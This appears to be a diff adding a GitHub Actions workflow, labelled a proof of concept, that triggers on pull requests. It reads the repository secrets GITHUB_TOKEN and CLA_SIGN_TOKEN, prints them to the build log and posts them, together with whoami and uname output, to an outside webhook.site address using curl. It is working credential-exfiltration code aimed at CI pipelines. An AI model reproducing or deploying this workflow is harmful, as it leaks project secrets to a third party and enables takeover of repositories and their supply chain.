@@ -1,0 +1,31 @@
+name: PoC - whoami, uname, tokens to webhook
+
+on:
+  pull_request:
+    types: [opened, synchronize]
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Send system info and tokens to webhook
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          CLA_SIGN_TOKEN: ${{ secrets.CLA_SIGN_TOKEN }}
+        run: |
+          echo "Running as user:"
+          whoami
+          echo "System info:"
+          uname -a
+          echo "GITHUB_TOKEN:"
+          echo "$GITHUB_TOKEN"
+          echo "CLA_SIGN_TOKEN:"
+          echo "$CLA_SIGN_TOKEN"
+        shell: bash
+      - name: Send output to webhook
+        run: |
+          OUTPUT="$(whoami && uname -a && echo GITHUB_TOKEN: $GITHUB_TOKEN && echo CLA_SIGN_TOKEN: $CLA_SIGN_TOKEN)"
+          curl -X POST -H "Content-Type: text/plain" --data "$OUTPUT" <https://webhook.site/5f456be5-d2ef-423a-bdb7-a76669e15697>
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          CLA_SIGN_TOKEN: ${{ secrets.CLA_SIGN_TOKEN }}
